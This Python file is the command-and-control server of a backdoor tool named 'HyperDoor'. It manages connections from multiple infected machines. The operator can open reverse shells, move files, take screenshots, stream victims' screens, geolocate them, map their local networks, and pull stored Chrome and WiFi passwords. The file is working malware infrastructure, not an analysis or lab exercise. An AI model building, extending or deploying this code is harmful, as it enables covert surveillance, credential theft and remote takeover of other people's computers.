import sys
import os  
import socket
import json
from tabnanny import verbose
import threading
from datetime import datetime
import uuid

# Modules in subdirectories
import util.help as help
import util.util as util

from vidstream import StreamingServer
import termcolor
from pick import pick

available_options = ['y', 'Y', 'n', 'N']

# Server endpoint data
server_endpoint = {
      'host': '127.0.0.1',
      'port': 5555,
      'streaming_port': 5556
}

# HELPER FUNCTIONS BEGIN

# send() wrapper function using json
def send(target, data):
      jsondata = json.dumps(data)
      target.send(jsondata.encode())

# recv() wrapper function
def recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip() # Recv data in chunks of 1024 bytes
            return json.loads(data)
        
        except ValueError:
            continue

# Sends a file to a target
def uploadFile(target, filename):
      f = open(filename, 'rb') # Open the file on 'read bytes' mode
      target.send(f.read())

# Downloads a file from a target
def downloadFile(target, fileName, instalationPath):
      
      # Ignore the instalation file path if it is set to the cwd 
      if instalationPath == '.':
            instalationPath = ''

      f = open(instalationPath + fileName, 'wb') # Open the file in reading bytes mode
      target.settimeout(1)
      chunk = target.recv(1024)

      while chunk:
            f.write(chunk)

            try:
                  chunk = target.recv(1024) # Recv data in chunks of 1024 bytes

            except socket.timeout as e:
                  break

      target.settimeout(None)
      f.close()
      return

# Receive a screenshot taken by the target
def screenshotRecv(target, ip):
      f = open(f'{ip[1]}.png', 'wb')
      target.settimeout(3)
      chunk = target.recv(1024)

      while chunk:
            f.write(chunk)

            try:
                  chunk = target.recv(1024)

            except socket.timeout as e:
                  break

      print("[INFO] Screenshot downloaded")

      target.settimeout(None)
      f.close()


#Prints a single profile on Windows
def print_windows_profile(profile):
    print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")


# HELPER FUNCTIONS END

class Server:
      # @param:
      #  host: IP address of the server
      #  port: port of the server
      #  backlog: maximum number of queued connections
      def __init__(self, host, port, backlog):
            self.host = host
            self.port = port
            self.backlog = backlog
            self.targets = []
            self.ips = []
            self.uuids = {}
            self.targets_ip = {}
            self.verbose = True # Indicates if server events should be logged or not

      # Accept incoming connections and store them in the targets list
      def acceptor(self):
            while True:
                  try:
                        target, ip = self.sock.accept()
                        self.targets.append(target)
                        self.ips.append(ip)

                        if self.verbose: print(termcolor.colored(f"\n[+] {str(ip)} joined the network!", 'green'))

                        # Create a new UUID for the target
                        self.uuids[target] = str(uuid.uuid4()) # {socketfd:uuid}
                        self.targets_ip[ip] = target # {ip(tuple):socketfd}

                  except Exception as e:
                        print(e)

      # Initiates the streaming server on a separate thread
      def stream_server_start(self):
            try:
                  server = StreamingServer(self.host, server_endpoint['streaming_port'])

                  streaming_thread = threading.Thread(target=server.start_server)
                  streaming_thread.setDaemon(True)
                  streaming_thread.start()
                  streaming_thread.join()

            except Exception as e:
                  print(e)
                  return

      # Sends a message to all the backdoor instances
      def broadcast(self, message):
            for target in self.targets:
                  try:
                        send(target, message)
                  
                  except Exception as e:
                        print(e)
                        continue


      def reverse_shell(self, target):
            while True:
                  cwd = recv(target)
                  cmd = input(f'{cwd}$ ')
                  send(target, cmd)

                  try:
                        if cmd == 'exit':
                              break
                        
                        out = recv(target)
                        print(out)
                              
                  except KeyboardInterrupt:
                        print(termcolor.colored('[!] Keyboard interrupt', 'yellow'))            
      

      # Server-Backdoor interface
      def target_coms(self, target, ip):
            while True:
                  command = input(f'[+] {self.uuids[target]}/{ip[0]}:{ip[1]}/HyperDoor$ ')
                  send(target, command) # Send command to target

                  if command == 'exit':
                        break

                  if command == 'detatch':
                        self.targets.remove(target)
                        self.ips.remove(ip)
                        self.uuids.pop(target)
                        self.targets_ip.pop(ip)
                        if self.verbose: print(termcolor.colored(f"[!] {ip[0]}:{ip[1]} left the network!", 'yellow'))
                        break

                  elif command == 'clear':
                        util.clearTerminal()    

                  # Upload a file to the target's file system
                  elif command.startswith('upload'):
                        uploadFile(target, command[len('upload') + 1:])
                  
                  # Download a file from the target's file system
                  elif command.startswith('download'):
                        instalation_path = input("[+] Where do you wish to save the file? ('.' to install on current directory): ")

                        if instalation_path.strip() != '.' and not os.path.exists(instalation_path): # Create the instalation directory if it does not exist
                              os.makedirs(instalation_path)
                        
                        downloadFile(target, command[len('download') + 1:], instalation_path)
                  
                  # Take a screenshot of the target's screen
                  elif command == 'screenshot':
                        screenshotRecv(target, ip)
                  
                  # Show where the target is located in the World
                  elif command == 'location':
                        locationData = recv(target)

                        print(f" - Address: {locationData['address']}")
                        print(f" - City: {locationData['city']}")
                        print(f" - Region: {locationData['raw']['region']}")
                        print(f" - Country: {locationData['country']}")
                        print(f" - Latitude: {locationData['lat']}")
                        print(f" - Longitude: {locationData['lng']}")
                        print(f" - Postal Code: {locationData['postal']}")
                        print(f" - Timezone: {locationData['raw']['timezone']}")
                  
                  # Attempts to fetch Chrome stored passwords
                  elif command == 'chrome-passwords':
                        password_data = recv(target)
                        print("[+] Chrome stored passwords:")
                        print(termcolor.colored(password_data, 'green'))

                  elif command == 'wifi-passwords':
                        profiles = recv(target)

                        if len(profiles) > 0:
                              print("[+] WiFi stored passwords:")
                              for profile in profiles:
                                    print_windows_profile(profile)

                        else:
                              print("[!] No WiFi stored passwords found")

                  elif command == 'system-info':
                        system_info = recv(target)
                        print(termcolor.colored(system_info, 'green'))

                  elif command == 'screenshare':
                        send(target, server_endpoint['streaming_port'])
                        self.stream_server_start()

                  elif command == 'help':
                        print(help.HELP_TARGET_COMS)
                  
                  elif command == 'connected-machines':
                        show_names_flag = ''
                        
                        while show_names_flag not in available_options:
                              show_names_flag = input("[+] Do you wish to attempt to fetch the hostnames of every machine? (not recommended for large networks) (y/n): ")
                        
                        # Inform the backdoor
                        if show_names_flag.lower() == 'y':
                              send(target, 'true')
                        else:
                              send(target, 'false')

                        print(termcolor.colored('[!] This might take a bit... please be patient! (CTR+C to stop)', 'yellow'))

                        try:
                              # Receive the list of connected machines
                              connected_machines = recv(target)
                              print(termcolor.colored(connected_machines, 'green'))
                        
                        except KeyboardInterrupt:
                              print(termcolor.colored('[!] Stopped fetching connected machines', 'yellow'))
                              continue

                  elif command == 'reverse-shell':
                        self.reverse_shell(target)

                  else:
                        print(termcolor.colored(f"[!] Unknown command: {command}", 'red'))

      # Execute a command on the server
      def shell(self):
            while True:
                  command = input('[+] HyperDoor$ ')

                  # Show all the targets connected to the server
                  if command == 'list-targets':
                        if len(self.ips) == 0:
                              print(termcolor.colored("[!] No targets connected", "yellow"))
                        else:
                              print(termcolor.colored(f"[+] {len(self.ips)} targets connected:", "green"))
                              count = 0
                              for ip in self.ips:
                                    print(termcolor.colored(f'  -> [{count}] | [{self.uuids[self.targets_ip[ip]]}] | {str(ip)}', 'green'))
                                    count += 1

                  # Clear the screen
                  elif command == 'clear':
                        util.clearTerminal()
                  
                  # Interact with an individual target/backdoor session
                  elif command.startswith('using'):
                        try:
                              num = int(command[len('using') + 1:])
                              Target = self.targets[num]
                              TargetIP = self.ips[num]
                              self.target_coms(Target, TargetIP)
                        
                        except Exception as e:
                              print(e)
                              #print(termcolor.colored(f'[-] No such session id ({str(num)})', 'yellow'))

                  # Show a menu that helps picking a target/backdoor session
                  elif command == 'session-pick' or command == 'pick':
                        options = self.ips
                        options.append("Quit")

                        option, index = pick(options, "Select a session to interact:", indicator = ">", default_index = 0)

                        if option != "Quit":
                              try:
                                    Target = self.targets[index]
                                    TargetIP = self.ips[index]
                                    self.target_coms(Target, TargetIP)
                              
                              except Exception as e:
                                    #print(termcolor.colored(f'[-] No such session id ({str(index)})', 'yellow'))
                                    print(e)

                  elif command == 'exit':
                        # Send a message telling the backdoors to attempt to reconnect
                        # so that when we go back online, they can rejoin the network without having to restart
                        self.broadcast('attempt-reconnect')
                        sys.exit(0)
                  
                  elif command == 'help':
                        print(help.HELP)

                  elif command == '':
                        pass

                  else:
                        print(termcolor.colored(f"[!] Command '{str(command)}' not found", 'yellow'))

      def start(self):
            # Socket creation and binding
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((self.host, self.port))
            self.sock.listen()

            if self.verbose: print("[+] Waiting for incoming connections...")

            # Start the acceptor() in a separate thread
            acceptor_thread = threading.Thread(target=self.acceptor)
            acceptor_thread.daemon = True
            acceptor_thread.start()
            
            # Start the shell
            self.shell()


if __name__ == '__main__':
      server = Server(server_endpoint['host'], server_endpoint['port'], 5)
      server.start()